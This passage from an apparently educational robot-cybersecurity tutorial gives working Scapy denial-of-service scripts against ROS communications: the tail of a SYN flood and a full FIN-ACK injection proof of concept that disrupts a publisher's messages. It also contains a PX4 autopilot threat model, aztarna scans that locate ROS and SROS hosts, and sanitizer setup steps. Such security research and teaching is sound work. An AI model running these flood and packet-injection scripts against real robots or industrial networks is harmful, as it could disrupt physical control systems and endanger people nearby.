    <span id="cb36-27"><a href="#cb36-27" aria-hidden="true" tabindex="-1"></a>p<span class="op">=</span>IP(dst<span class="op">=</span>dst_target,<span class="bu">id</span><span class="op">=</span><span class="dv">1111</span>,ttl<span class="op">=</span><span class="dv">99</span>)<span class="op">/</span>TCP(sport<span class="op">=</span>RandShort(),dport<span class="op">=</span>dport_target,seq<span class="op">=</span><span class="dv">1232345</span>,ack<span class="op">=</span><span class="dv">10000</span>,window<span class="op">=</span><span class="dv">10000</span>,flags<span class="op">=</span><span class="st">&quot;S&quot;</span>)<span class="op">/</span><span class="st">&quot;SYN Flood DoS&quot;</span></span>
    <span id="cb36-28"><a href="#cb36-28" aria-hidden="true" tabindex="-1"></a>ls(p)</span>
    <span id="cb36-29"><a href="#cb36-29" aria-hidden="true" tabindex="-1"></a>ans,unans<span class="op">=</span>srloop(p,inter<span class="op">=</span><span class="fl">0.05</span>,retry<span class="op">=</span><span class="dv">2</span>,timeout<span class="op">=</span><span class="dv">4</span>)</span></code></pre></div>
    <p>In many systems, attacker would find no issues executing this attack and would be able to bring down ROSTCP interactions if the target machine’s networking stack isn’t properly configured. To defend against this attack, a user would need to set up their kernel’s network stack appropriately. In particular, they’d need to ensure that <code>TCP SYN cookies</code> are enabled. <code>SYN cookies</code> work by not using the <code>SYN</code> queue at all. Instead, the kernel simply replies to the <code>SYN</code> with a <code>SYN-ACK</code>, but will include a specially crafted TCP sequence number that encodes the source and destination IP address, port number and the time the packet was sent. A legitimate connection would send the <code>ACK</code> packet of the three way handshake with the specially crafted sequence number. This allows the system to verify that it has received a valid response to a <code>SY cookie</code> and allow the connection, even though there is no corresponding <code>SYN</code> in the queue.</p>
    <h3 id="fin-ack-flood-attack-targeting-ros-1">FIN-ACK flood attack targeting ROS</h3>
    <p>The previous <code>SYN-ACK</code> DoS flooding attack did not affect hardened control stations because it is blocked by <code>SYN cookies</code> at the Linux kernel level. I dug a bit further and looked for alternatives to disrupt ROS-Industrial communications, even in in the presence of hardening (at least to the best of my current knowledge).</p>
    <p>After testing a variety of attacks against the ROS-Industrial network including <code>ACK and PUSH ACK</code> flooding, <code>ACK Fragmentation</code> flooding or <code>Spoofed Session</code> flooding among others, assuming the role of an attacker I developed a valid disruption proof-of-concept using the <code>FIN-ACK</code> attack. Roughly, soon after a successful three or four-way <code>TCP-SYN</code> session is established, the <code>FIN-ACK</code> attack sends a <code>FIN</code> packet to close the <code>TCP-SYN</code> session between a host and a client machine. Given a <code>TCP-SYN</code> session established by ROSTCP between two entities wherein one is relying information of the robot to the other (running the ROS master) for coordination, the <code>FIN-ACK</code> flood attack sends a large number of spoofed <code>FIN</code> packets that do not belong to any session on the target server. The attack has two consequences: first, it tries to exhaust a recipient’s resources – its RAM, CPU, etc. as the target tries to process these invalid requests. Second, the communication is being constantly finalized by the attacker which leads to ROS messages being lost in the process, leading to the potential loss of relevant data or a significant lowering of the reception rate which might affect the performance of certain robotic algorithms.</p>
    <p>The following script displays the simple proof-of-concept developed configured for validating the attack in the simplified isolated scenario.</p>
    <div class="sourceCode" id="cb37"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> tcpros_fin_ack():</span>
    <span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">&quot;&quot;&quot;</span></span>
    <span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="co">    crafting a FIN ACK interrupting publisher&#39;s comms</span></span>
    <span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a><span class="co">    &quot;&quot;&quot;</span></span>
    <span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a>    flag_valid <span class="op">=</span> <span class="va">True</span></span>
    <span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a>    targetp <span class="op">=</span> <span class="va">None</span></span>
    <span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a>    targetp_ack <span class="op">=</span> <span class="va">None</span></span>
    <span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a>    <span class="co"># fetch 10 tcp packages</span></span>
    <span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> flag_valid:</span>
    <span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a>        packages <span class="op">=</span> sniff(iface<span class="op">=</span><span class="st">&quot;eth0&quot;</span>, <span class="bu">filter</span><span class="op">=</span><span class="st">&quot;tcp&quot;</span>, count<span class="op">=</span><span class="dv">4</span>)</span>
    <span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="bu">len</span>(packages[TCPROSBody]) <span class="op">&lt;</span> <span class="dv">1</span>:</span>
    <span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a>            <span class="cf">continue</span></span>
    <span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
    <span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a>            <span class="co"># find first TCPROSBody and pick a target</span></span>
    <span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a>            targetp <span class="op">=</span> packages[TCPROSBody][<span class="op">-</span><span class="dv">1</span>]  <span class="co"># pick latest instance</span></span>
    <span id="cb37-16"><a href="#cb37-16" aria-hidden="true" tabindex="-1"></a>            index <span class="op">=</span> packages.index(packages[TCPROSBody][<span class="op">-</span><span class="dv">1</span>])</span>
    <span id="cb37-17"><a href="#cb37-17" aria-hidden="true" tabindex="-1"></a>            <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(index <span class="op">+</span> <span class="dv">1</span>, <span class="bu">len</span>(packages)):</span>
    <span id="cb37-18"><a href="#cb37-18" aria-hidden="true" tabindex="-1"></a>                targetp_ack <span class="op">=</span> packages[i]</span>
    <span id="cb37-19"><a href="#cb37-19" aria-hidden="true" tabindex="-1"></a>                <span class="co"># check if the ack matches appropriately</span></span>
    <span id="cb37-20"><a href="#cb37-20" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> targetp[IP].src <span class="op">==</span> targetp_ack[IP].dst <span class="kw">and</span> <span class="op">\</span></span>
    <span id="cb37-21"><a href="#cb37-21" aria-hidden="true" tabindex="-1"></a>                        targetp[IP].dst <span class="op">==</span> targetp_ack[IP].src <span class="kw">and</span> <span class="op">\</span></span>
    <span id="cb37-22"><a href="#cb37-22" aria-hidden="true" tabindex="-1"></a>                        targetp[TCP].sport <span class="op">==</span> targetp_ack[TCP].dport <span class="kw">and</span> <span class="op">\</span></span>
    <span id="cb37-23"><a href="#cb37-23" aria-hidden="true" tabindex="-1"></a>                        targetp[TCP].dport <span class="op">==</span> targetp_ack[TCP].sport <span class="kw">and</span> <span class="op">\</span></span>
    <span id="cb37-24"><a href="#cb37-24" aria-hidden="true" tabindex="-1"></a>                        targetp[TCP].ack <span class="op">==</span> targetp_ack[TCP].seq:</span>
    <span id="cb37-25"><a href="#cb37-25" aria-hidden="true" tabindex="-1"></a>                    flag_valid <span class="op">=</span> <span class="va">False</span></span>
    <span id="cb37-26"><a href="#cb37-26" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">break</span></span>
    <span id="cb37-27"><a href="#cb37-27" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb37-28"><a href="#cb37-28" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> flag_valid <span class="kw">and</span> targetp_ack <span class="kw">and</span> targetp:</span>
    <span id="cb37-29"><a href="#cb37-29" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Option 2</span></span>
    <span id="cb37-30"><a href="#cb37-30" aria-hidden="true" tabindex="-1"></a>        p_attack <span class="op">=</span>IP(src<span class="op">=</span>targetp[IP].src, dst<span class="op">=</span>targetp[IP].dst,<span class="bu">id</span><span class="op">=</span>targetp[IP].<span class="bu">id</span> <span class="op">+</span> <span class="dv">1</span>,ttl<span class="op">=</span><span class="dv">99</span>)<span class="op">\</span></span>
    <span id="cb37-31"><a href="#cb37-31" aria-hidden="true" tabindex="-1"></a>            <span class="op">/</span>TCP(sport<span class="op">=</span>targetp[TCP].sport,dport<span class="op">=</span>targetp[TCP].dport,flags<span class="op">=</span><span class="st">&quot;FA&quot;</span>, seq<span class="op">=</span>targetp_ack[TCP].ack,</span>
    <span id="cb37-32"><a href="#cb37-32" aria-hidden="true" tabindex="-1"></a>            ack<span class="op">=</span>targetp_ack[TCP].seq)</span>
    <span id="cb37-33"><a href="#cb37-33" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb37-34"><a href="#cb37-34" aria-hidden="true" tabindex="-1"></a>        ans <span class="op">=</span> sr1(p_attack, retry<span class="op">=</span><span class="dv">0</span>, timeout<span class="op">=</span><span class="dv">1</span>)</span>
    <span id="cb37-35"><a href="#cb37-35" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb37-36"><a href="#cb37-36" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> ans <span class="kw">and</span> <span class="bu">len</span>(ans) <span class="op">&gt;</span> <span class="dv">0</span> <span class="kw">and</span> ans[TCP].flags <span class="op">==</span> <span class="st">&quot;FA&quot;</span>:</span>
    <span id="cb37-37"><a href="#cb37-37" aria-hidden="true" tabindex="-1"></a>            p_ack <span class="op">=</span>IP(src<span class="op">=</span>targetp[IP].src, dst<span class="op">=</span>targetp[IP].dst,<span class="bu">id</span><span class="op">=</span>targetp[IP].<span class="bu">id</span> <span class="op">+</span> <span class="dv">1</span>,ttl<span class="op">=</span><span class="dv">99</span>)<span class="op">\</span></span>
    <span id="cb37-38"><a href="#cb37-38" aria-hidden="true" tabindex="-1"></a>                <span class="op">/</span>TCP(sport<span class="op">=</span>targetp[TCP].sport,dport<span class="op">=</span>targetp[TCP].dport,flags<span class="op">=</span><span class="st">&quot;A&quot;</span>, seq<span class="op">=</span>ans[TCP].ack,</span>
    <span id="cb37-39"><a href="#cb37-39" aria-hidden="true" tabindex="-1"></a>                ack<span class="op">=</span>ans[TCP].seq <span class="op">+</span> <span class="dv">1</span>)</span>
    <span id="cb37-40"><a href="#cb37-40" aria-hidden="true" tabindex="-1"></a>            send(p_ack)</span>
    <span id="cb37-41"><a href="#cb37-41" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb37-42"><a href="#cb37-42" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="va">True</span>:</span>
    <span id="cb37-43"><a href="#cb37-43" aria-hidden="true" tabindex="-1"></a>    tcpros_fin_ack()</span></code></pre></div>
    <p>The following figure shows the result of the <code>FIN-ACK</code> attack on a targeted machine. Image displays a significant reduction of the reception rate and down to more than half (4.940 Hz) from the designated 10 Hz of transmission. The information sent from the publisher consists of an iterative integer number however the data received in the target <em>under attack</em> shows significant integer jumps, which confirm the package losses. More elaborated attacks could be built upon using a time-sensitive approach. A time-sensitive approach could lead to more elaborated attacks.</p>
    <p><img src="../../images/2021/fin_ack_attack.png" /></p>
    <h2 id="px4-autopilot">PX4 autopilot</h2>
    <p>The <a href="https://px4.io/software/software-overview/">PX4 autopilot</a> is an open source flight autopilot for drone developers. It’s advertised as a</p>
    <blockquote>
    <p>an open source flight control software for drones and other unmanned vehicles. The project provides a flexible set of tools for drone developers to share technologies to create tailored solutions for drone applications. PX4 provides a standard to deliver drone hardware support and software stack, allowing an ecosystem to build and maintain hardware and software in a scalable way.</p>
    <p>PX4 is part of Dronecode, a non-profit organization administered by Linux Foundation to foster the use of open source software on flying vehicles. Dronecode also hosts QGroundControl, MAVLink &amp; the SDK.</p>
    </blockquote>
    <p>Alternatives to PX4 include <a href="https://ardupilot.org/">Ardupilot (APM)</a> and <a href="https://wiki.paparazziuav.org/wiki/Main_Page">Paparazzi</a>.</p>
    <h3 id="understanding-the-threat-landscape">Understanding the threat landscape</h3>
    <p>Let’s start by performing a simple threat modeling exercise on the autopilot to understand its threat landscape:</p>
    <figure>
    <img src="../../images/2021/PX4_autopilot.png" alt="PX4 autopilot software and hardware components" /><figcaption aria-hidden="true">PX4 autopilot software and hardware components</figcaption>
    </figure>
    <p>Note that there’re various communication buses and protocols depicted. Of most importance: - <a href="https://dev.px4.io/v1.10_noredirect/en/middleware/uorb.html"><code>uORB</code></a>: uORB is an asynchronous publish/subscribe messaging API maintained within the PX4 project and used for intra-process/inter-process communication. Depicted with dark arrows, most autopilot software components<span class="sidenote-wrapper"><label for="sn-20" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-20" class="margin-toggle"/><span class="sidenote">At the time of writing.<br />
    <br />
    </span></span> rely heavily on <code>uORB</code> for interactions. <code>uORB</code> is designed to be lightweight Note how <code>uORB</code> interactions are restricted to internal software components and how <strong>it’s not directly exposed to any external interface due to its lack of security</strong>. Thought the <code>uORB</code> communication middleware is not directly exposed, if an attacker were to use one of the exposed interfaces (e.g. through insecure peripheral communications) and were to obtain privileges to execute code within associated software components, compromising the internal architecture through uORB would be trivial. - <a href="https://mavlink.io/en/">MAVLink</a>: MAVLink is a very lightweight messaging protocol for communicating with drones (and between onboard drone components) that generally interfaces with either <a href="https://mavlink.io/en/mavgen_c/example_c_uart.html">UART</a> or <a href="https://mavlink.io/en/mavgen_c/example_c_udp.html">UDP</a>. Initially designed without security and later reviewed to add <em>some</em> security capabilities (MAVLink 2), MAVLink is widely used between a GCS and drone, and between drone autopilot and MAVLink enabled drone peripherals (e.g. a camera). The lack of a security-centric approach from its conception has led to <a href="https://github.com/aliasrobotics/RVD/labels/robot%20component%3A%20PX4">various reported security vulnerabilities</a> which allows attackers to compromise the intra and inter-drone interactions<span class="sidenote-wrapper"><label for="sn-21" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-21" class="margin-toggle"/><span class="sidenote">Official e-manual of TB3 http://emanual.robotis.com/docs/en/platform/turtlebot3/overview/<br />
    <br />
    </span></span>. - <a href="https://docs.px4.io/master/en/middleware/micrortps.html">Micro-XRCE and DDS</a>: Traveling over UDP<span class="sidenote-wrapper"><label for="sn-22" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-22" class="margin-toggle"/><span class="sidenote">ROS 2 specific section in TB3 e-manual http://emanual.robotis.com/docs/en/platform/turtlebot3/ros2/<br />
    <br />
    </span></span>, the DDS communication middleware is the alternative presented by PX4 to MAVLink. DDS provides certain security capabilities (see previous case studies) however these aspects are not translated to resource constrained DDS endpoints. In the case of few resources, OMG created a different DDS spec called DDS-XRCE which stands for eXtremely Resource Constrained Environments. Micro-XRCE is one of the implementations of DDS-XRCE. The compromised security mechanisms of DDS (discussed in previous case studies) and the <a href="https://micro.ros.org/docs/overview/ROS_2_feature_comparison/">lacking security mechanisms of DDS-XRCE</a> present simple entrypoints that attacker could leverage.</p>
    <p>Depicting all of this again while drawing the entrypoints and a few boundaries to identify trust zones (<em>trust boundaries</em>) leads to the following:</p>
    <figure>
    <img src="../../images/2021/PX4_diagram_entrypoints.png" alt="PX4 autopilot software and hardware components" /><figcaption aria-hidden="true">PX4 autopilot software and hardware components</figcaption>
    </figure>
    <h3 id="static-analysis-of-px4-autopilot">Static analysis of PX4 autopilot</h3>
    <p>Refer to <a href="https://www.youtube.com/watch?v=phHYfAqjOuQ">The cybersecurity status of PX4 — PX4 Developer Summit Virtual 2020</a> to learn more about the results while statically analyzing PX4.</p>
    <h3 id="a-simulated-drone-for-security-research-purposes">A simulated drone for security research purposes</h3>
    <p>The best way to security research PX4 is to bring up a simulated drone using PX4 SITL and Gazebo for drone and environment simulation. The following links capture the essence of how to do so: - <a href="https://docs.px4.io/master/en/simulation/">PX4 Simulation - basics</a> - <a href="https://dev.px4.io/v1.9.0_noredirect/en/test_and_ci/docker.html">PX4 Docker Containers - developers</a> (see <code>px4-dev-ros</code> tag, and similar ones) - <a href="https://docs.px4.io/master/en/test_and_ci/docker.html">PX4 Docker Containers - users</a> - Examples to prepare the environment: - <a href="https://docs.px4.io/master/en/simulation/multi_vehicle_simulation_gazebo.html">Multi-Vehicle Simulation with Gazebo</a> - <a href="https://docs.px4.io/master/en/ros/ros2_offboard_control.html">ROS 2 Offboard Control Example - (demonstrates RTPS interactions, etc)</a></p>
    <h1 id="reconnaissance">Reconnaissance</h1>
    <h2 id="footprinting-ros-systems">Footprinting ROS systems</h2>
    <p>Footprinting, (also known as <em>reconnaissance</em>) is the technique used for gathering information about digital systems and the entities they belong to. To get this information, a security analyst might use various tools and technologies. This information is very useful when performing a series attacks over an specific system.</p>
    <p>ROS is the de facto standard for robot application development. This tutorial will show how to localize ROS systems and obtain additional information about them using the <code>aztarna</code> security tool. <code>aztarna</code> means “footprint” in <em>basque</em>.</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb38"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity_footprinting1:latest .</span></code></pre></div>
    <p>and runned with:</p>
    <div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> basic_cybersecurity_footprinting1:latest</span></code></pre></div>
    <hr />
    <h3 id="ros-footprinting-basics">ROS footprinting basics</h3>
    <p>The first thing we do to test the capabilities of <code>aztarna</code> is to get a container with the right dependencies and the tool installed:</p>
    <pre class="smallcontent"><code>```bash

    # from this directory:
    docker build -t basic_cybersecurity_footprinting1:latest .
    ...

    ```</code></pre>
    <p>Let’s launch an instance of ROS in the default port and see how <code>aztarna</code> can detect it:</p>
    <pre class="smallcontent"><code>```bash

    docker run --privileged -it basic_cybersecurity_footprinting1:latest
    root@3c22d4bbf4e1:/# roscore -p 11311 &amp;
    root@3c22d4bbf4e1:/# roscore -p 11317 &amp;
    root@3c22d4bbf4e1:/# aztarna -t ROS -p 11311 -a 127.0.0.1
    [+] ROS Host found at 127.0.0.1:11311


    root@3c22d4bbf4e1:/# aztarna -t ROS -p 11311-11320 -a 127.0.0.1
    root@432b0c5f61cc:~/aztarna# aztarna -t ROS -p 11311-11320 -a 127.0.0.1
    [-] Error connecting to host Address: 127.0.0.1: Cannot connect to host 127.0.0.1:11315 ssl:None [Connection refused]
        Not a ROS host
    [-] Error connecting to host Address: 127.0.0.1: Cannot connect to host 127.0.0.1:11312 ssl:None [Connection refused]
        Not a ROS host
    [-] Error connecting to host Address: 127.0.0.1: Cannot connect to host 127.0.0.1:11316 ssl:None [Connection refused]
        Not a ROS host
    [-] Error connecting to host Address: 127.0.0.1: Cannot connect to host 127.0.0.1:11313 ssl:None [Connection refused]
        Not a ROS host
    [-] Error connecting to host Address: 127.0.0.1: Cannot connect to host 127.0.0.1:11314 ssl:None [Connection refused]
        Not a ROS host
    [-] Error connecting to host Address: 127.0.0.1: Cannot connect to host 127.0.0.1:11318 ssl:None [Connection refused]
        Not a ROS host
    [-] Error connecting to host Address: 127.0.0.1: Cannot connect to host 127.0.0.1:11319 ssl:None [Connection refused]
        Not a ROS host
    [+] ROS Host found at 127.0.0.1:11317
    [+] ROS Host found at 127.0.0.1:11311

    ```</code></pre>
    <p>Launches and scans reasonably fast:</p>
    <pre class="smallcontent"><code>```bash
    root@3c22d4bbf4e1:/# time aztarna -t ROS -p 11311-11320 -a 127.0.0.1
    ...
    real    0m0.687s
    user    0m0.620s
    sys 0m0.040s
    ```</code></pre>
    <p>More information about a particular ROS Host can be obtained with the <code>-e</code> flag:</p>
    <pre class="smallcontent"><code>```bash
    root@aa6b6d7f9bd3:/# aztarna -t ROS -p 11311 -a 127.0.0.1 -e
    [+] ROS Host found at 127.0.0.1:11311

    Node: /rosout XMLRPCUri: http://aa6b6d7f9bd3:39719

         Published topics:
             * /rosout_agg(Type: rosgraph_msgs/Log)

         Subscribed topics:
             * /rosout(Type: rosgraph_msgs/Log)

         Services:
             * /rosout/set_logger_level
             * /rosout/get_loggers

         CommunicationROS 0:
             - Publishers:
             - Topic: /rosout(Type: rosgraph_msgs/Log)
             - Subscribers:
                /rosout XMLRPCUri: http://aa6b6d7f9bd3:39719

         CommunicationROS 1:
             - Publishers:
                /rosout XMLRPCUri: http://aa6b6d7f9bd3:39719
             - Topic: /rosout_agg(Type: rosgraph_msgs/Log)
             - Subscribers:
    ```</code></pre>
    <h3 id="checking-for-all-ros-instances-in-a-machine">Checking for all ROS instances in a machine</h3>
    <p>A simple way to check for ROS within a particular machine is to chain the <code>aztarna</code> tool with other common bash utilities:</p>
    <pre class="smallcontent"><code>```bash
    root@bc6af321d62e:/# nmap -p 1-65535 127.0.0.1 | grep open | awk &#39;{print $1}&#39; | sed &quot;s*/tcp**&quot; | sed &quot;s/^/aztarna -t ROS -p /&quot; | sed &quot;s/$/ -a 127.0.0.1/&quot; | bash
    [+] ROS Host found at 127.0.0.1:11311



    [+] ROS Host found at 127.0.0.1:11317



    [-] Error connecting to host 127.0.0.1:38069 -&gt; Unknown error
        Not a ROS host
    [-] Error connecting to host 127.0.0.1:38793 -&gt; Unknown error
        Not a ROS host
    [-] Error connecting to host 127.0.0.1:45665 -&gt; &lt;type &#39;exceptions.Exception&#39;&gt;:method &quot;getSystemState&quot; is not supported
        Not a ROS host
    [-] Error connecting to host 127.0.0.1:46499 -&gt; &lt;type &#39;exceptions.Exception&#39;&gt;:method &quot;getSystemState&quot; is not supported
        Not a ROS host
    [ERROR] [1543085503.685199009]: a header of over a gigabyte was predicted in tcpros. that seems highly unlikely, so I&#39;ll assume protocol synchronization is lost.
    [-] Error connecting to host 127.0.0.1:55905 -&gt; None
        Not a ROS host
    [ERROR] [1543085504.415197656]: a header of over a gigabyte was predicted in tcpros. that seems highly unlikely, so I&#39;ll assume protocol synchronization is lost.
    [-] Error connecting to host 127.0.0.1:59939 -&gt; None
        Not a ROS host

    ```</code></pre>
    <h3 id="resources">Resources</h3>
    <ul>
    <li>[1] aztarna. Retrieved from https://github.com/aliasrobotics/aztarna.</li>
    <li>[2] Docker of ROS. Retrieved from https://hub.docker.com/_/ros/.</li>
    </ul>
    <h2 id="footprinting-secure-ros-systems">Footprinting Secure ROS systems</h2>
    <p>Following from the previous tutorial, in this one we’ll analyze secure ROS setups using the SROS package.</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb45"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity_footprinting2:latest .</span></code></pre></div>
    <p>and runned with:</p>
    <div class="sourceCode" id="cb46"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> basic_cybersecurity_footprinting2:latest</span></code></pre></div>
    <hr />
    <h3 id="understanding-sros">Understanding SROS</h3>
    <p>According to [5], SROS has three levels of concepts: the Transport Security level, the Access Control level, and the Process Profile level. These levels and concepts are summarized below and later sections go into each of these in greater detail.</p>
    <p>[4] provides some additional intuition about each one of these levels.</p>
    <h3 id="footprinting-sros-systems">Footprinting SROS systems</h3>
    <div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Launching Keyserver</span></span>
    <span id="cb47-2"><a href="#cb47-2" aria-hidden="true" tabindex="-1"></a><span class="ex">sroskeyserver</span> <span class="kw">&amp;</span></span>
    <span id="cb47-3"><a href="#cb47-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Launching the secure ROS Master</span></span>
    <span id="cb47-4"><a href="#cb47-4" aria-hidden="true" tabindex="-1"></a><span class="ex">sroscore</span> <span class="kw">&amp;</span></span>
    <span id="cb47-5"><a href="#cb47-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Launch aztarna with the right options</span></span>
    <span id="cb47-6"><a href="#cb47-6" aria-hidden="true" tabindex="-1"></a><span class="ex">aztarna</span> <span class="at">-t</span> SROS <span class="at">-a</span> 127.0.0.1</span>
    <span id="cb47-7"><a href="#cb47-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Connecting</span> to 127.0.0.1:11311</span>
    <span id="cb47-8"><a href="#cb47-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> SROS host found!!!</span></code></pre></div>
    <h3 id="resources-1">Resources</h3>
    <ul>
    <li>[1] aztarna. Retrieved from https://github.com/aliasrobotics/aztarna.</li>
    <li>[2] Docker of ROS. Retrieved from https://hub.docker.com/_/ros/.</li>
    <li>[3] SROS documentation. Retrieved from http://wiki.ros.org/SROS.</li>
    <li>[4] SROS tutorials. Retrieved from http://wiki.ros.org/SROS/Tutorials</li>
    <li>[4] SROS concepts. Retrieved from http://wiki.ros.org/SROS/Concepts</li>
    </ul>
    <h1 id="robot-vulnerabilities">Robot vulnerabilities</h1>
    <h2 id="robot-sanitizers-in-ros-2-dashing">Robot sanitizers in ROS 2 Dashing</h2>
    <p>Sanitizers are dynamic bug finding tools[1]. In this tutorial we’ll use some common and open source sanitizers over the ROS 2 codebase. In particular, by reproducing previously available results[2,3], we’ll review the security status of ROS 2 Dashing Diademata.</p>
    <p>The first few sections provide a walkthrough on the attempt to make things run in OS X. The sections that follow automate the process through a Docker container.</p>
    <h3 id="os-x">OS X</h3>
    <details>
    <summary>
    Setup in OS X, natively
    </summary>
    <h3 id="setup">Setup</h3>
    <p>For the setup, I’m working in an OS X 10.14 machine:</p>
    <div class="sourceCode" id="cb48"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="co"># mixins are configuration files used to compile ROS 2 easily</span></span>
    <span id="cb48-2"><a href="#cb48-2" aria-hidden="true" tabindex="-1"></a><span class="ex">pip3</span> install colcon-mixin</span>
    <span id="cb48-3"><a href="#cb48-3" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> mixin add default https://raw.githubusercontent.com/colcon/colcon-mixin-repository/master/index.yaml</span>
    <span id="cb48-4"><a href="#cb48-4" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> mixin update default</span>
    <span id="cb48-5"><a href="#cb48-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb48-6"><a href="#cb48-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Create workspace</span></span>
    <span id="cb48-7"><a href="#cb48-7" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> ~/ros2_asan_ws/src</span>
    <span id="cb48-8"><a href="#cb48-8" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ~/ros2_asan_ws</span>
    <span id="cb48-9"><a href="#cb48-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb48-10"><a href="#cb48-10" aria-hidden="true" tabindex="-1"></a><span class="co"># colcon-santizer-reports for analyzing ROS 2</span></span>
    <span id="cb48-11"><a href="#cb48-11" aria-hidden="true" tabindex="-1"></a><span class="co">#   a plugin for colcon test that parses sanitizer issues </span></span>
    <span id="cb48-12"><a href="#cb48-12" aria-hidden="true" tabindex="-1"></a><span class="co">#   from stdout/stderr, deduplicates the issues, and outputs them to a CSV.</span></span>
    <span id="cb48-13"><a href="#cb48-13" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/colcon/colcon-sanitizer-reports.git</span>
    <span id="cb48-14"><a href="#cb48-14" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> colcon-sanitizer-reports</span>
    <span id="cb48-15"><a href="#cb48-15" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3 setup.py install</span>
    <span id="cb48-16"><a href="#cb48-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb48-17"><a href="#cb48-17" aria-hidden="true" tabindex="-1"></a><span class="co"># setup ccache to speed-up dev. process</span></span>
    <span id="cb48-18"><a href="#cb48-18" aria-hidden="true" tabindex="-1"></a><span class="co">#  speeds up recompilation by caching the result of previous compilations </span></span>
    <span id="cb48-19"><a href="#cb48-19" aria-hidden="true" tabindex="-1"></a><span class="co">#  and detecting when the same compilation is being done again</span></span>
    <span id="cb48-20"><a href="#cb48-20" aria-hidden="true" tabindex="-1"></a><span class="co">#  https://github.com/ccache/ccache</span></span>
    <span id="cb48-21"><a href="#cb48-21" aria-hidden="true" tabindex="-1"></a><span class="ex">brew</span> install ccache</span>
    <span id="cb48-22"><a href="#cb48-22" aria-hidden="true" tabindex="-1"></a><span class="ex">ccache</span> <span class="at">-M</span> 20G <span class="co"># increase cache size</span></span>
    <span id="cb48-23"><a href="#cb48-23" aria-hidden="true" tabindex="-1"></a><span class="co"># # Add the following to your .bashrc or .zshrc file and restart your terminal:</span></span>
    <span id="cb48-24"><a href="#cb48-24" aria-hidden="true" tabindex="-1"></a><span class="co"># echo &#39;export CC=/usr/lib/ccache/gcc&#39; &gt;&gt; ~/.bash_profile</span></span>
    <span id="cb48-25"><a href="#cb48-25" aria-hidden="true" tabindex="-1"></a><span class="co"># echo &#39;export CXX=/usr/lib/ccache/g++&#39; &gt;&gt; ~/.bash_profile</span></span>
